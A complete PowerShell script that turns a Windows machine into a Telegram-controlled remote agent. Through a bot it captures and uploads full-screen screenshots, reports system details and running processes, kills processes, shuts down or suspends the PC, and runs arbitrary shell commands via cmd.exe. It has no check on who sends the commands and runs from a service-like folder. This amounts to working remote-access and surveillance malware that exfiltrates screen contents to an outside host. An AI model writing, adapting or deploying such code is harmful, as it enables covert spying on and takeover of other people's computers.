[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ErrorActionPreference = "Continue"
$ProgressPreference   = "SilentlyContinue"

# ================= CONFIG =================
$Token  = "YOUR-TELEGRAM-API-TOKEN"
$ChatId = "YOUR-CHAT-ID"

$BaseDir = "$env:LOCALAPPDATA\WinTgService"
$LogFile = "$BaseDir\service.log"
$TmpDir  = "$BaseDir\tmp"

New-Item $BaseDir -ItemType Directory -Force | Out-Null
New-Item $TmpDir  -ItemType Directory -Force | Out-Null

# ================= LOG =================
function Write-Log($msg) {
    $line = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') :: $msg"
    Add-Content -Path $LogFile -Value $line
}

# ================= TELEGRAM TEXT =================
function Tg-Send($text) {
    try {
        Invoke-RestMethod `
            -Uri "https://api.telegram.org/bot$Token/sendMessage" `
            -Method Post `
            -Body @{
                chat_id = $ChatId
                text    = $text
            } | Out-Null
        Write-Log "Sent message: $text"
    } catch {
        Write-Log ("Send message error: " + $_.Exception.Message)
    }
}

# ================= TELEGRAM DOCUMENT =================
function Tg-Document($filePath) {
    try {
        if (-not (Test-Path $filePath)) {
            throw "File not found: $filePath"
        }

        $boundary = [System.Guid]::NewGuid().ToString()
        $LF = "`r`n"

        $bodyLines = @(
            "--$boundary$LF" +
            "Content-Disposition: form-data; name=`"chat_id`"$LF$LF$ChatId$LF"
            "--$boundary$LF" +
            "Content-Disposition: form-data; name=`"document`"; filename=`"screenshot.jpg`"$LF" +
            "Content-Type: image/jpeg$LF$LF"
        )

        $bodyFooter = "$LF--$boundary--$LF"

        $headerBytes = [System.Text.Encoding]::ASCII.GetBytes(($bodyLines -join ""))
        $fileBytes   = [System.IO.File]::ReadAllBytes($filePath)
        $footerBytes = [System.Text.Encoding]::ASCII.GetBytes($bodyFooter)

        $body = New-Object byte[] ($headerBytes.Length + $fileBytes.Length + $footerBytes.Length)
        [Array]::Copy($headerBytes, 0, $body, 0, $headerBytes.Length)
        [Array]::Copy($fileBytes, 0, $body, $headerBytes.Length, $fileBytes.Length)
        [Array]::Copy($footerBytes, 0, $body, $headerBytes.Length + $fileBytes.Length, $footerBytes.Length)

        Invoke-WebRequest `
            -Uri "https://api.telegram.org/bot$Token/sendDocument" `
            -Method Post `
            -ContentType "multipart/form-data; boundary=$boundary" `
            -Body $body `
            -UseBasicParsing | Out-Null

        Write-Log "Screenshot sent successfully: $filePath"
    } catch {
        Write-Log ("Telegram document send error: " + $_.Exception.Message)
        Tg-Send "Screenshot failed"
    }
}

# ================= SCREENSHOT (FULLSCREEN, MULTI-MONITOR, JPEG) =================
function Take-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing

        $virtualBounds = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $bmp = New-Object System.Drawing.Bitmap $virtualBounds.Width, $virtualBounds.Height
        $gfx = [System.Drawing.Graphics]::FromImage($bmp)

        $gfx.CompositingQuality = [System.Drawing.Drawing2D.CompositingQuality]::HighQuality
        $gfx.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::High
        $gfx.PixelOffsetMode = [System.Drawing.Drawing2D.PixelOffsetMode]::HighQuality

        $gfx.CopyFromScreen(
            $virtualBounds.X,
            $virtualBounds.Y,
            0,
            0,
            $virtualBounds.Size,
            [System.Drawing.CopyPixelOperation]::SourceCopy
        )

        $file = "$TmpDir\screenshot.jpg"

        $jpegCodec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() |
            Where-Object { $_.MimeType -eq "image/jpeg" }
        $encParams = New-Object System.Drawing.Imaging.EncoderParameters 1
        $encParams.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter `
            ([System.Drawing.Imaging.Encoder]::Quality, 80)
        $bmp.Save($file, $jpegCodec, $encParams)

        $gfx.Dispose()
        $bmp.Dispose()

        Write-Log ("Screenshot saved: " + (Get-Item $file).Length + " bytes")
        Write-Log ("Resolution: {0}x{1}" -f $virtualBounds.Width, $virtualBounds.Height)

        Tg-Document $file
    } catch {
        Write-Log ("Screenshot error: " + $_.Exception.Message)
        Tg-Send "Screenshot error"
    }
}

# ================= COMMAND HANDLER =================
function Handle-Command($cmd) {
    Write-Log "Received: $cmd"

    switch -Regex ($cmd) {
        "^shutdown$"   { shutdown /s /t 0 }
        "^restart$"    { shutdown /r /t 0 }
        "^lock$"       { rundll32 user32.dll,LockWorkStation }
        "^screenshot$" { Take-Screenshot }
        "^sysinfo$" {
            $comp = $env:COMPUTERNAME
            $user = $env:USERNAME
            $os   = (Get-CimInstance Win32_OperatingSystem).Caption
            $cpu  = (Get-CimInstance Win32_Processor).Name
            $ram  = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
            $ip   = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' -and $_.PrefixOrigin -eq 'Dhcp' }).IPAddress
            $msg  = "PC: $comp`nUser: $user`nOS: $os`nCPU: $cpu`nRAM: ${ram}GB`nIP: $($ip -join ', ')"
            Tg-Send $msg
        }
        "^processes$" {
            $procs = Get-Process | Sort-Object CPU -Descending | Select-Object -First 10 Name,CPU
            $msg = ($procs | ForEach-Object { "$($_.Name) : $([math]::Round($_.CPU,2))s" }) -join "`n"
            Tg-Send $msg
        }
        "^kill\s+(\w+)$" {
            ${processName} = $matches[1]
            try {
                Stop-Process -Name $processName -Force
                Tg-Send "Process $processName terminated."
                Write-Log "Killed process: ${processName}"
            } catch {
                Tg-Send "Failed to terminate ${processName}: $_"
                Write-Log "Failed to kill process ${processName}: $_"
            }
        }
        "^disk$" {
            $drives = Get-PSDrive -PSProvider 'FileSystem' | Select-Object Name, Used, Free, @{Name='Total';Expression={($_.Used + $_.Free)/1GB -as [int]}}
            $msg = ($drives | ForEach-Object { "$($_.Name): Free $([math]::Round($_.Free/1GB,1)) GB / Total $([math]::Round($_.Total,1)) GB" }) -join "`n"
            Tg-Send $msg
        }
        "^sleep$" { rundll32.exe powrprof.dll,SetSuspendState 0,1,0 }
        "^hibernate$" { rundll32.exe powrprof.dll,SetSuspendState Hibernate }
        "^ping\s+(\S+)$" {
            $pingHost = $matches[1]
            $res = Test-Connection -ComputerName $pingHost -Count 2 -Quiet
            Tg-Send "$host reachable: $res"
        }
        "^status$" {
            $uptime = (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
            $days = $uptime.Days
            $hours = $uptime.Hours
            $minutes = $uptime.Minutes
            $seconds = $uptime.Seconds
            $msg = "Bot running. Uptime: ${days}d ${hours}h ${minutes}m ${seconds}s"
            Tg-Send $msg
        }
        "^run\s+(.+)$" {
            $appCmd = $matches[1]
            try {
                Start-Process -FilePath "cmd.exe" -ArgumentList "/c $appCmd"
                Tg-Send "Executed: $appCmd"
            } catch {
                Tg-Send "Failed to execute ${appCmd}: $_"
            }
        }
        default { Tg-Send "Unknown command" }
    }
}

# ================= POLLING =================
$offset = 0
Tg-Send "Bot started"

while ($true) {
    try {
        $resp = Invoke-RestMethod `
            -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$offset&timeout=20" `
            -Method Get

        foreach ($u in $resp.result) {
            $offset = $u.update_id + 1
            if ($u.message.text) {
                Handle-Command $u.message.text
            }
        }
    } catch {
        Write-Log ("Polling error: " + $_.Exception.Message)
    }

    Start-Sleep -Seconds 3
}

